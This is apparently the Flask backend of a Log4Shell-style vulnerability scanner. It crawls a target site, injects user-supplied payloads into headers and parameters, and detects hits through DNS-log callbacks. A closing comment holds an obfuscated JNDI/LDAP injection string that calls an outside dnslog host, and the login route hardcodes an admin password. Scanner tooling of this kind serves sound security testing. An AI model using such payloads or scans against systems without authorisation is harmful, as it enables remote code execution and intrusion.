# -*- coding:utf-8 -*-
import copy
import os
import time
from datetime import timedelta
from urlparse import urlparse, urljoin, parse_qs
from flask_cors import CORS
from flask import Flask, request, session

from lib.dnsCheck import Dnslog
from lib.payload import trans
from lib.urlClass import urlClass
from lib.urlScapy import SpiderMain

app = Flask(__name__)
CORS(app, resources=r'/*')

app.config['SECRET_KEY'] = os.urandom(24)
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)


@app.route('/login', methods=['POST'])
def login():
    username = getParams(request, 'username')
    password = getParams(request, 'password')
    # res = {}
    if username == "admin" and password == "lzy226":
        res = {"code": 20000, "data": {"token": "admin-token"}}
    else:
        res = {"code": 400, "data": {}}
    return res


@app.route('/info', methods=['GET'])
def info():
    res = {
        "code": 20000,
        "data": {
            "roles": [
                "admin"
            ],
            "introduction": "I am a super administrator",
            "avatar": "https://wpimg.wallstcn.com/f778738c-e4f8-4870-b634-56703b4acafe.gif",
            "name": "Super Admin"
        }
    }
    return res


@app.route('/logout', methods=['GET', 'POST'])
def logout():
    res = {"code": 20000, "data": 'success'}
    return res


# 目标网站扫描
# url: 目标网站网址
# threadNum: 扫描线程数量
@app.route('/scan', methods=['POST'])
def scanWebsite():
    url = getParams(request, 'url')
    threadNum = int(getParams(request, 'threadNum'))

    if url == "":
        return {"code": 20000, "data": {"total": 0, "items": []}}
    session['url'] = url
    # try:
    test = SpiderMain(url, threadNum)
    result = test.craw()
    dict = []
    id = 0
    for i in result:
        # dict[count] = i.toJson()
        id += 1
        dict.append(i.toJson(id))
    return {"code": 20000, "data": {"total": id, "items": dict}}




@app.route('/check', methods=['POST'])
def check():
    vuln = []
    unvuln = []
    # 读取参数 保存为urlClass类
    urlList = getParams(request, 'urlList')
    begin = time.time()
    for item in urlList:
        param = item['param'].split(',')
        args = item['args'].split(',')
        if 'origin' not in item.keys():
            item['origin'] = item['url']
        url = urlClass(item['origin'], item['url'], param, args)

        # 获取scan结果
        result = dnsCheck(url, session['details'])

        print result
        urlItem = url.toJson(item['id'])
        if result['status'] == True:
            urlItem['payload'] = result['payload']
            urlItem['vulnHeader'] = result['vulnHeader']
            urlItem['vulnArgs'] = result['vulnArgs']
            print urlItem
            vuln.append(urlItem)
        else:
            unvuln.append(urlItem)

    status = True if len(vuln) > 0 else False
    end = time.time()
    cost_time = int(end - begin)
    print {"code": 20000,
            "data":
                {
                    "vuln": vuln, "unvuln": unvuln,
                    "status": status, "time": cost_time,
                    "total": len(urlList), "payloads": len(urlList)*len(session['payloads'])*161
                }
            }
    return {"code": 20000,
            "data":
                {
                    "vuln": vuln, "unvuln": unvuln,
                    "status": status, "time": cost_time,
                    "total": len(urlList), "payloads": len(urlList)*len(session['payloads'])*161
                }
            }


@app.route('/fuzzing', methods=["POST"])
def fuzzing():
    item = getParams(request, 'url')
    url = urlClass(item['origin'], item['url'], item['param'], item['args'])
    for fuzz in session['fuzzdict']:
        if url.Fuzzing(session['headers'], fuzz):
            print "It is ALLOWED ..."
        else:
            print "It is BANNED ..."
    return "Fuzzing Complete ..."


@app.route('/fuzzdict', methods=["POST"])
def getFuzzDict():
    session['fuzzdict'] = getParams(request, 'fuzzdict')
    return "Fuzzdict commit ..."


@app.route("/headers", methods=["POST"])
def headers():
    try:
        session['headers'] = getParams(request, 'headers')
        # session['headers'] = getParams(request, 'headers')
        # print getParams(request, 'headers')
        # print session['headers']
        return {"code": 20000}
    except:
        return {"code": 500}


@app.route("/checkHeaders", methods=["POST"])
def checkHeaders():
    try:
        session['checkHeaders'] = getParams(request, 'headers')
        print session['checkHeaders']
        return {"code": 20000}
    except:
        return {"code": 500}


@app.route("/payloads", methods=["POST"])
def getPayloads():
    try:
        session['payloads'] = getParams(request, 'payloads')
        session['details'] = getParams(request, 'details')
        # print session['payloads']
        print session['details']
        return {"code": 20000}
    except:
        return {"code": 500}


# 获取参数
def getParams(request, param):
    try:
        # GET方法
        if request.method == "GET":
            comment = request.args.get(param)

        # POST方法
        if request.method == "POST":
            comment = request.json.get(param)
        return comment
    except:
        return ""


def dnsCheck(url, payloads):
    result = {
        'status': False,
        'count': 161 * len(payloads),
        'payload': ''
    }
    for payload in payloads:
        dns = Dnslog()

        headers_demo = copy.deepcopy(session['headers'])
        result = dns.check(url, headers_demo, payload, session['checkHeaders'])

        print result
        if result['status']:
            return result
    return result


if __name__ == '__main__':
    app.run()


# ${${up${sys:sun.cpu.isalist}per:j}${up${sys:sun.cpu.isalist}per:n}${up${sys:sun.cpu.isalist}per:d}${up${sys:sun.cpu.isalist}per:i}:${da${sys:sun.cpu.isalist}te:'l'}${da${sys:sun.cpu.isalist}te:'d'}${da${sys:sun.cpu.isalist}te:'a'}${da${sys:sun.cpu.isalist}te:'p'}://kchhya.dnslog.cn/}
